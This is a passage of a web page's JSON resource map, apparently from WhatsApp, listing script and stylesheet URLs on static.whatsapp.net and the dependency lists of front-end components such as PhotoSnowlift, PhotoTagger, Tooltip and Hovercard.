"https:\/\/static.whatsapp.net\/rsrc.php\/v3ii6o4\/yL\/l\/ar_AR\/VMAdkfY02Fu.js?_nc_x=Ij3Wp8lg5Kz" }, "j\/XsUIg": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y4\/r\/jjHyAo-J8e5.js?_nc_x=Ij3Wp8lg5Kz" }, "TsDff51": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/sgJPtFDG42k.js?_nc_x=Ij3Wp8lg5Kz" }, "yr4qxCD": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y3\/r\/zX6EsX3PHdx.js?_nc_x=Ij3Wp8lg5Kz" }, "\/g73V0k": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/eu31i6kUQCb.js?_nc_x=Ij3Wp8lg5Kz" }, "YeEn7Pm": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y4\/r\/pz4FQvWI5C_.js?_nc_x=Ij3Wp8lg5Kz" }, "rkQHihK": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yn\/r\/uqA8WYRcLXR.js?_nc_x=Ij3Wp8lg5Kz" }, "99LBMn6": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yj\/r\/QzoUX97YXzC.js?_nc_x=Ij3Wp8lg5Kz" }, "8+\/m\/R9": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yp\/r\/oRJudaJhcJb.js?_nc_x=Ij3Wp8lg5Kz" }, "STfNYsg": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/NOl3nSdj5Uh.js?_nc_x=Ij3Wp8lg5Kz" }, "b+4kH42": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/cg3phlyJ-1B.js?_nc_x=Ij3Wp8lg5Kz" }, "HrSvOcT": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y4\/r\/21-3aT7RQ8b.js?_nc_x=Ij3Wp8lg5Kz" }, "aIstZuG": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/4Ex5otKRH3u.js?_nc_x=Ij3Wp8lg5Kz" }, "6V5ZFvF": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/-cmBNRC9qHk.js?_nc_x=Ij3Wp8lg5Kz" }, "61rx7+d": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y4\/r\/GKxvddgm8SV.js?_nc_x=Ij3Wp8lg5Kz" }, "epaoL7R": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ym\/r\/w0U_JSIrUJn.js?_nc_x=Ij3Wp8lg5Kz" }, "DQmdiRz": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yY\/r\/N7CqNTPxP7e.js?_nc_x=Ij3Wp8lg5Kz" }, "RvYbgmg": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3irwZ4\/yx\/l\/ar_AR\/fqUFvGP4znl.js?_nc_x=Ij3Wp8lg5Kz" }, "xlMpWQZ": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/m81HXiJulf5.js?_nc_x=Ij3Wp8lg5Kz" }, "ww+w9NB": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/mQ_dC0DQ96y.js?_nc_x=Ij3Wp8lg5Kz" }, "t46GVsr": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/3QX3yaFWkhM.js?_nc_x=Ij3Wp8lg5Kz" }, "Ayd2Csx": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/l\/1,cross\/An0tYMUUlvk.css?_nc_x=Ij3Wp8lg5Kz" }, "9zce+oe": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yd\/r\/b5H46z9Cl4X.js?_nc_x=Ij3Wp8lg5Kz" }, "asppkhA": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/PQw5R0QVhly.js?_nc_x=Ij3Wp8lg5Kz" }, "jjYsTQO": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/r\/GvLXkts-ew_.js?_nc_x=Ij3Wp8lg5Kz" }, "UqUvMpW": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/cqy5sWYK2yi.js?_nc_x=Ij3Wp8lg5Kz" }, "Nx3aG7o": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/r\/CBuiJ_0o6vC.js?_nc_x=Ij3Wp8lg5Kz" }, "meXqvUG": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/r\/BQWILtvS5fB.js?_nc_x=Ij3Wp8lg5Kz" }, "K5\/vbf9": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yO\/r\/fRALbyo2PtK.js?_nc_x=Ij3Wp8lg5Kz" }, "Gbf1TUE": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yU\/r\/irCGtkIPaVi.js?_nc_x=Ij3Wp8lg5Kz" }, "lTO89wT": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/l\/1,cross\/VlvCuYmGcGN.css?_nc_x=Ij3Wp8lg5Kz" }, "dUh4UaO": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/r\/uCEz0QZZJeE.js?_nc_x=Ij3Wp8lg5Kz" }, "aY\/DPr5": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yg\/r\/ls3MrukJA4r.js?_nc_x=Ij3Wp8lg5Kz" }, "7lKRbsA": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yI\/r\/YbTdNI1oFjq.js?_nc_x=Ij3Wp8lg5Kz" }, "LOtoMvf": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/o3ecpK2xuE4.js?_nc_x=Ij3Wp8lg5Kz" }, "0C9ajyY": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/r\/PK6LRymLZ-q.js?_nc_x=Ij3Wp8lg5Kz" }, "zpXyMKc": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iDXe4\/y4\/l\/ar_AR\/ZFTEW9lMcTE.js?_nc_x=Ij3Wp8lg5Kz" }, "ejUA2yq": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/3j8pqvn1nLW.js?_nc_x=Ij3Wp8lg5Kz" }, "LYq\/bb\/": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yi\/l\/1,cross\/-0he2st81ix.css?_nc_x=Ij3Wp8lg5Kz" }, "si7b3Zu": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/r\/sHLio9jJccX.js?_nc_x=Ij3Wp8lg5Kz" }, "txstYBE": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y1\/r\/WYsujcW9-qe.js?_nc_x=Ij3Wp8lg5Kz" }, "4gKni9p": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/l\/1,cross\/GjY-dP5IglQ.css?_nc_x=Ij3Wp8lg5Kz" }, "cIwjOS0": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yA\/r\/qL2HTURBxH2.js?_nc_x=Ij3Wp8lg5Kz" }, "hRnYGn1": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y7\/r\/zVF0G3CWP71.js?_nc_x=Ij3Wp8lg5Kz" }, "jWuQPCW": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yn\/r\/W4Vc7GDmnBt.js?_nc_x=Ij3Wp8lg5Kz" }, "VfuLkfj": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yX\/r\/zZHIBNAJKnh.js?_nc_x=Ij3Wp8lg5Kz" }, "XV0Z0ix": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/IP50YqMMQW7.js?_nc_x=Ij3Wp8lg5Kz" }, "Cqzu\/ty": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/r\/QcPOxvKPtDI.js?_nc_x=Ij3Wp8lg5Kz" }, "vhkkr4i": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/z4VjNe4hDxP.js?_nc_x=Ij3Wp8lg5Kz" }, "l3xlu6+": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y_\/r\/PLjgfCSd4jd.js?_nc_x=Ij3Wp8lg5Kz" }, "nwf0WzB": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/JryE5LHQY21.js?_nc_x=Ij3Wp8lg5Kz" }, "RG5qq+e": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y_\/r\/gu3kb4SNbxM.js?_nc_x=Ij3Wp8lg5Kz" }, "NQcY4GA": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yp\/r\/0SMW_5uzOy3.js?_nc_x=Ij3Wp8lg5Kz" }, "CvndCfq": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/rBvx5OxA8Dg.js?_nc_x=Ij3Wp8lg5Kz" }, "r92wvYV": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yl\/r\/deC1d5viPp9.js?_nc_x=Ij3Wp8lg5Kz" }, "uKw0LU7": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/0w5O3NCWM_m.js?_nc_x=Ij3Wp8lg5Kz" }, "OjcdEI8": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iGWm4\/yl\/l\/ar_AR\/wblpew1hPTs.js?_nc_x=Ij3Wp8lg5Kz" }, "xmz7Lk6": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yk\/l\/1,cross\/12yOzjcZccJ.css?_nc_x=Ij3Wp8lg5Kz" }, "UcjljO7": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yS\/l\/1,cross\/CDmikBmxMfm.css?_nc_x=Ij3Wp8lg5Kz" }, "a2j96E0": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iMhH4\/yo\/l\/ar_AR\/xP1GRaDgCXb.js?_nc_x=Ij3Wp8lg5Kz" }, "X4+I4b2": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/l\/1,cross\/yytLyJ2F8SD.css?_nc_x=Ij3Wp8lg5Kz" }, "v6HipfT": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3imgt4\/yI\/l\/ar_AR\/Ay61VwtiHUt.js?_nc_x=Ij3Wp8lg5Kz" }, "L8mVdge": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yG\/r\/axDvMbuOEDt.js?_nc_x=Ij3Wp8lg5Kz" }, "Bs3127y": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/hUVn-Gwij2X.js?_nc_x=Ij3Wp8lg5Kz" }, "SGb7OcH": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y1\/l\/1,cross\/BtNd2ZTOu3q.css?_nc_x=Ij3Wp8lg5Kz" }, "Yelqfuz": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/ZrDO1OS3CNE.js?_nc_x=Ij3Wp8lg5Kz" }, "VDymvVI": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/l\/1,cross\/btytK-RFo3s.css?_nc_x=Ij3Wp8lg5Kz" }, "8vKBOmk": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/l\/1,cross\/1ddtdQ9Ta0I.css?_nc_x=Ij3Wp8lg5Kz" }, "\/j+rPH4": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i1VK4\/y6\/l\/ar_AR\/ObblcsVzBvz.js?_nc_x=Ij3Wp8lg5Kz" }, "tIfMNoz": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yG\/r\/txAgBzo0idb.js?_nc_x=Ij3Wp8lg5Kz" }, "Kfkjcy2": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/3SnS2ZmKspL.js?_nc_x=Ij3Wp8lg5Kz" }, "Yy8quYS": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yN\/l\/1,cross\/QMeWOusbKab.css?_nc_x=Ij3Wp8lg5Kz" }, "woU7G1a": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iECs4\/y9\/l\/ar_AR\/QsW3PxcWsL9.js?_nc_x=Ij3Wp8lg5Kz" }, "18tbGeA": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/zyqKKLXLVLx.js?_nc_x=Ij3Wp8lg5Kz" }, "sJhkEUj": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yo\/r\/G46avKyqtTU.js?_nc_x=Ij3Wp8lg5Kz" }, "fQwhlTT": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yQ\/r\/VftRnkD_b4D.js?_nc_x=Ij3Wp8lg5Kz" }, "JIYg9tN": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/S_v_s5cfGQN.js?_nc_x=Ij3Wp8lg5Kz" }, "hmc0Ch2": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y3\/r\/n-ZwnDSTvqK.js?_nc_x=Ij3Wp8lg5Kz" }, "ipCbG2E": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/l\/1,cross\/UzvF0-M5RNs.css?_nc_x=Ij3Wp8lg5Kz" }, "yyJPDys": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/l\/1,cross\/CFFbq5q-lZU.css?_nc_x=Ij3Wp8lg5Kz" }, "aHchuMx": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ii6o4\/yd\/l\/ar_AR\/jDFD0ZXU610.js?_nc_x=Ij3Wp8lg5Kz" }, "npROeLX": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yV\/l\/1,cross\/XkyVDkrmIsn.css?_nc_x=Ij3Wp8lg5Kz" }, "cWd25so": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yJ\/l\/1,cross\/57JSTbNI850.css?_nc_x=Ij3Wp8lg5Kz" }, "zL8BGdJ": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y9\/r\/44qHY6_bM8_.js?_nc_x=Ij3Wp8lg5Kz" }, "b\/rYFtF": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/hGd1ihAEoHH.js?_nc_x=Ij3Wp8lg5Kz" }, "b9sATVO": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/r\/oXAkgPAYF7S.js?_nc_x=Ij3Wp8lg5Kz" }, "UILE36u": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y1\/r\/8hyYXwjAlkL.js?_nc_x=Ij3Wp8lg5Kz" }, "bY7KX1c": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/r\/ODGAY_s0avx.js?_nc_x=Ij3Wp8lg5Kz" }, "3QBOKTC": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yk\/r\/YRw2-r3uZ9a.js?_nc_x=Ij3Wp8lg5Kz" }, "yMgn4BF": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yA\/r\/-u-KeKSHGqH.js?_nc_x=Ij3Wp8lg5Kz" }, "2aXIT1s": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yc\/r\/L_UPmlkYlxG.js?_nc_x=Ij3Wp8lg5Kz" }, "45AtGCk": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yD\/r\/AW47QdZRqJX.js?_nc_x=Ij3Wp8lg5Kz" }, "W+kpw\/V": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y1\/r\/QOFkjmJmURV.js?_nc_x=Ij3Wp8lg5Kz" }, "feyvgDh": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y9\/r\/BPG_AObaSm0.js?_nc_x=Ij3Wp8lg5Kz" }, "41Ne5YX": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yh\/l\/1,cross\/vQC-QNp41tC.css?_nc_x=Ij3Wp8lg5Kz" }, "M9rh1r7": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3imp74\/yF\/l\/ar_AR\/M9nNCT0TLl7.js?_nc_x=Ij3Wp8lg5Kz" }, "VB4zTC3": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yy\/r\/ozTlFblbI9G.js?_nc_x=Ij3Wp8lg5Kz" }, "rFUfoY0": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yT\/l\/1,cross\/TiGa-dPZl__.css?_nc_x=Ij3Wp8lg5Kz" }, "77m8Uso": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i38Q4\/yx\/l\/ar_AR\/nu2W7plHdwI.js?_nc_x=Ij3Wp8lg5Kz" }, "YOIvG\/m": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y0\/r\/JFVuEcosDZn.js?_nc_x=Ij3Wp8lg5Kz" }, "J62RfGM": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yX\/r\/iHYH2B5RJ-A.js?_nc_x=Ij3Wp8lg5Kz" }, "88+gRST": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yC\/r\/DFlQoGK9R4V.js?_nc_x=Ij3Wp8lg5Kz" }, "HBK9MF6": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iyiq4\/yD\/l\/ar_AR\/7JJUKEJbg2M.js?_nc_x=Ij3Wp8lg5Kz" }, "gWMJgTe": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yH\/r\/iGksp69foR_.js?_nc_x=Ij3Wp8lg5Kz" }, "hIek+bG": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yY\/r\/DZ_VBlsy-dC.js?_nc_x=Ij3Wp8lg5Kz" }, "dDsarxb": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ibg84\/yn\/l\/ar_AR\/XlvQuj9LGMQ.js?_nc_x=Ij3Wp8lg5Kz" }, "20549oV": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iYpb4\/yW\/l\/ar_AR\/CixO5oGylwa.js?_nc_x=Ij3Wp8lg5Kz" }, "8ELCBwH": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ye\/r\/VRzSVH5iU-V.js?_nc_x=Ij3Wp8lg5Kz" }, "1tEzGmI": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yr\/r\/YNPVccXNJmR.js?_nc_x=Ij3Wp8lg5Kz" }, "SWx3yNv": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y7\/r\/g__eV5OXSXl.js?_nc_x=Ij3Wp8lg5Kz" }, "x22Oby4": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yZ\/r\/tVshp1OIV9l.js?_nc_x=Ij3Wp8lg5Kz" }, "G2yK9wR": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/5NAKA_q8MEE.js?_nc_x=Ij3Wp8lg5Kz" }, "UWlPw6D": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yy\/r\/YJHbLAZ6dgP.js?_nc_x=Ij3Wp8lg5Kz" }, "VhquNVl": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yp\/r\/4VGIWkxeDth.js?_nc_x=Ij3Wp8lg5Kz" }, "161SwvX": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/r\/0sRyfmnv8FX.js?_nc_x=Ij3Wp8lg5Kz" }, "H\/5lfuF": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/r\/kiBZxOy2Z4K.js?_nc_x=Ij3Wp8lg5Kz" }, "8TNZYzX": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/ZL1A46FYUm6.js?_nc_x=Ij3Wp8lg5Kz" } }, "compMap": { "Dock": { "r": ["LX1aYVl", "Af0v4Z0", "aMZ15\/K", "my4T6B4", "vXVmoSO", "9G3hptj", "uW12T1t", "EqTnb+\/", "WRhAqCJ", "zV8nP9g", "gjt0UlN", "34IjhTr", "FW+GhOb"], "be": 1 }, "WebSpeedInteractionsTypedLogger": { "r": ["WRhAqCJ", "LX1aYVl", "a2YBUdi", "my4T6B4", "iqaNd7v"], "rds": { "m": ["BanzaiScuba_DEPRECATED"], "r": ["Af0v4Z0"] }, "be": 1 }, "AsyncRequest": { "r": ["LX1aYVl", "Af0v4Z0", "FW+GhOb", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent"], "r": ["a2YBUdi"] }, "be": 1 }, "DOM": { "r": ["LX1aYVl", "Af0v4Z0", "FW+GhOb"], "be": 1 }, "Form": { "r": ["LX1aYVl", "Af0v4Z0", "DS80Qf6", "WRhAqCJ", "aMZ15\/K", "FW+GhOb"], "be": 1 }, "FormSubmit": { "r": ["LX1aYVl", "Af0v4Z0", "DS80Qf6", "WRhAqCJ", "aMZ15\/K", "lYMIqwV", "FW+GhOb", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"], "r": ["a2YBUdi"] }, "be": 1 }, "Input": { "r": ["DS80Qf6"], "be": 1 }, "Toggler": { "r": ["LX1aYVl", "Af0v4Z0", "my4T6B4", "aMZ15\/K", "9G3hptj", "uW12T1t", "EqTnb+\/", "WRhAqCJ", "zV8nP9g", "gjt0UlN", "FW+GhOb"], "be": 1 }, "Tooltip": { "r": ["LX1aYVl", "Af0v4Z0", "my4T6B4", "gjt0UlN", "DS80Qf6", "anQXi\/0", "uW12T1t", "5tesmBe", "aMZ15\/K", "R5w1rCJ", "9G3hptj", "FW+GhOb", "3v0vBAN", "WRhAqCJ", "vQ2oxzP", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent", "PageTransitions", "BanzaiScuba_DEPRECATED", "Animation"], "r": ["a2YBUdi", "IsaKnm5"] }, "be": 1 }, "URI": { "r": [], "be": 1 }, "trackReferrer": { "r": [], "rds": { "m": ["BanzaiScuba_DEPRECATED"], "r": ["LX1aYVl", "a2YBUdi", "Af0v4Z0"] }, "be": 1 }, "PhotoTagApproval": { "r": ["LX1aYVl", "Af0v4Z0", "rlbiS2R", "+2mYsBo", "FW+GhOb"], "be": 1 }, "PhotoSnowlift": { "r": ["LX1aYVl", "Af0v4Z0", "DS80Qf6", "WRhAqCJ", "aMZ15\/K", "K7ursti", "EqTnb+\/", "IsaKnm5", "my4T6B4", "9G3hptj", "uW12T1t", "gjt0UlN", "K95O88f", "lGcuWFY", "MA7wtBb", "5tesmBe", "anQXi\/0", "mdAFoUs", "Cyo1q1h", "WB+BRYy", "Y3RUmNH", "5QF1Vlf", "ZM\/66tK", "vOJl9Mi", "n+jECvZ", "48r1VFg", "ZWW+dax", "S3KXb64", "VESpy09", "R5w1rCJ", "FW+GhOb", "3v0vBAN", "zV8nP9g", "a2YBUdi", "e6uIOhT", "Ox\/z9Em", "2UdiOZ8", "hUDGDA4", "dsf5Sdn", "T3YJWJ1", "Et43WS9", "hm7LH2C", "aSbaNKt", "M8Xp01T", "YmFpgbD", "mw0cRSV", "s6f7kQQ", "j8vinei", "yPN8Cty", "GS4bGVX", "8q2zxdD", "mDomTSa", "8LpAtc0", "NUcs7zk", "zuJ\/ghe", "fUlW\/15", "zVTqSl6", "Y+PD8c3", "VgOUvrQ", "9EKSmsD", "u5lyyOe", "oPTgYNC", "kw5YG6Z", "iXU77vs", "8pnRkHq", "a1GO+nL", "j\/XsUIg", "TsDff51", "yr4qxCD", "\/g73V0k", "YeEn7Pm", "rkQHihK", "99LBMn6", "8+\/m\/R9", "STfNYsg", "b+4kH42", "HrSvOcT", "aIstZuG", "6V5ZFvF", "61rx7+d", "epaoL7R", "DQmdiRz", "RvYbgmg", "xlMpWQZ", "ww+w9NB", "t46GVsr", "Ayd2Csx", "9zce+oe", "asppkhA", "jjYsTQO", "UqUvMpW", "Nx3aG7o", "meXqvUG", "K5\/vbf9", "Gbf1TUE", "lTO89wT", "dUh4UaO", "aY\/DPr5", "7lKRbsA", "LOtoMvf", "0C9ajyY", "zpXyMKc", "ejUA2yq", "LYq\/bb\/", "si7b3Zu", "txstYBE", "4gKni9p", "cIwjOS0", "hRnYGn1", "jWuQPCW", "VfuLkfj", "XV0Z0ix", "rlbiS2R", "Cqzu\/ty", "vhkkr4i", "l3xlu6+", "nwf0WzB", "RG5qq+e", "NQcY4GA", "CvndCfq", "r92wvYV", "uKw0LU7", "OjcdEI8", "xmz7Lk6", "UcjljO7", "a2j96E0", "X4+I4b2", "v6HipfT", "L8mVdge", "Bs3127y", "SGb7OcH", "Yelqfuz", "vQ2oxzP", "VDymvVI", "8vKBOmk", "\/j+rPH4"], "rds": { "m": ["Animation", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions"] }, "be": 1 }, "PhotoTagger": { "r": ["a1GO+nL", "WB+BRYy", "LX1aYVl", "Af0v4Z0", "tIfMNoz", "my4T6B4", "9G3hptj", "uW12T1t", "EqTnb+\/", "WRhAqCJ", "gjt0UlN", "Cyo1q1h", "zV8nP9g", "R5w1rCJ", "5tesmBe", "aMZ15\/K", "DS80Qf6", "anQXi\/0", "FW+GhOb", "3v0vBAN", "K7ursti", "IsaKnm5", "Kfkjcy2", "Yy8quYS", "woU7G1a", "18tbGeA", "sJhkEUj", "fQwhlTT", "a2YBUdi", "JIYg9tN", "hmc0Ch2", "ipCbG2E", "yyJPDys", "vQ2oxzP", "aHchuMx", "npROeLX", "cWd25so", "zL8BGdJ", "b\/rYFtF", "rlbiS2R", "b9sATVO", "r92wvYV", "UILE36u", "bY7KX1c", "3QBOKTC", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions", "Animation"] }, "be": 1 }, "PhotoTags": { "r": ["LX1aYVl", "Af0v4Z0", "rlbiS2R", "yMgn4BF", "FW+GhOb"], "be": 1 }, "TagTokenizer": { "r": ["LX1aYVl", "Af0v4Z0", "gjt0UlN", "2aXIT1s", "45AtGCk", "W+kpw\/V", "feyvgDh", "41Ne5YX", "M9rh1r7", "VB4zTC3", "my4T6B4", "9G3hptj", "uW12T1t", "EqTnb+\/", "DS80Qf6", "rFUfoY0", "77m8Uso", "YOIvG\/m", "J62RfGM", "88+gRST", "HBK9MF6", "FW+GhOb", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent"], "r": ["a2YBUdi"] }, "be": 1 }, "AsyncDialog": { "r": ["LX1aYVl", "Af0v4Z0", "WRhAqCJ", "zV8nP9g", "aMZ15\/K", "uW12T1t", "R5w1rCJ", "DS80Qf6", "my4T6B4", "gjt0UlN", "9G3hptj", "FW+GhOb", "3v0vBAN", "EqTnb+\/", "K7ursti", "IsaKnm5", "anQXi\/0", "a2YBUdi", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent"] }, "be": 1 }, "Hovercard": { "r": ["LX1aYVl", "Af0v4Z0", "my4T6B4", "9G3hptj", "uW12T1t", "EqTnb+\/", "WB+BRYy", "WRhAqCJ", "gjt0UlN", "Cyo1q1h", "zV8nP9g", "R5w1rCJ", "5tesmBe", "aMZ15\/K", "DS80Qf6", "anQXi\/0", "FW+GhOb", "3v0vBAN", "K7ursti", "IsaKnm5", "Kfkjcy2", "Yy8quYS", "woU7G1a", "18tbGeA", "sJhkEUj", "fQwhlTT", "a2YBUdi", "JIYg9tN", "hmc0Ch2", "ipCbG2E", "yyJPDys", "vQ2oxzP", "aHchuMx", "e6uIOhT"], "rds": 